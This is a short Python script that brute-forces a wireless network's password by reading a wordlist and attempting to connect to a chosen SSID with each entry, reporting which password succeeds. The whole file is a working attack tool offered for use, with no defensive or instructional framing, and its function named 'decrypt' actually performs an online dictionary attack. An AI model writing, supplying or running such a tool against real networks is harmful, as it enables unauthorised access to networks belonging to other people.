from wireless import Wireless
import argparse as arg

def get_arguments():
    """Get arguments from the command line"""
    parser = arg.ArgumentParser()
    parser.add_argument('-f', '--file', dest='file', help='Path to File containing Passwords [default: passwords.txt]', default='passwords.txt')
    parser.add_argument('-s', '--ssid', dest='ssid', help='The SSID of the wireless network (the name of the network)')
    options = parser.parse_args()
    if not options.ssid:
        options = None
    return options

def decrypt(ssid, pwdFile):
    wire = Wireless()
    with open(pwdFile, 'r') as file:
        for line in file.readlines():
            if wire.connect(ssid=ssid, password=line.strip()) == True:
                print(f'[+] Success!! Password is: {line.strip()}')
            else:
                print(f'[-] {line.strip()} - Failed!!')

if __name__ == '__main__':
    optionsValues = get_arguments()
    if optionsValues:
        decrypt(optionsValues.ssid, optionsValues.file)
    else:
        ssid = input("[>] SSID of the wireless network: ")
        pwd_file = input("[>] Path to passwords file: ")
        print('\n')
        decrypt(ssid, pwd_file)